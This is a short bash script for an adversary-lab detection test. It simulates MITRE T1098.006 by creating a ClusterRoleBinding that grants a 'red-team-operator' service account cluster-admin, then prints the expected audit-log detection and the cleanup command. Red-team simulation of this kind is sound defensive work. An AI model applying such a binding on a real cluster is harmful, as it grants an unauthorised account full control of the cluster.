#!/bin/bash
# ============================================================================
# Attack Simulation: ClusterRoleBinding Creation
# MITRE ATT&CK: T1098.006 - Additional Container Cluster Roles
# Run from: kubectl exec -it kubectl -n attacker -- /bin/sh
# ============================================================================

set -e

BINDING_NAME="adversary-lab-test-crb-$(date +%s)"

echo "[*] Creating ClusterRoleBinding: $BINDING_NAME"
echo "[*] This binds the attacker's red-team-operator SA to cluster-admin"
echo ""

cat <<EOF | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: $BINDING_NAME
  labels:
    adversary-lab/test: "T1098.006"
    adversary-lab/cleanup: "true"
  annotations:
    adversary-lab/mitre: "T1098.006"
    adversary-lab/warning: "Created by attack simulation - safe to delete"
subjects:
  - kind: ServiceAccount
    name: red-team-operator
    namespace: attacker
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
EOF

echo ""
echo "[*] ClusterRoleBinding created: $BINDING_NAME"
echo "[*] Expected detection: T1098.006 - RBAC Binding Created by Non-System Principal"
echo "[*] Expected log table: AKSAudit"
echo ""
echo "[!] To clean up after testing:"
echo "    kubectl delete clusterrolebinding $BINDING_NAME"

# Output the binding name for the test harness to consume
echo "$BINDING_NAME" > /tmp/attack-binding-name.txt
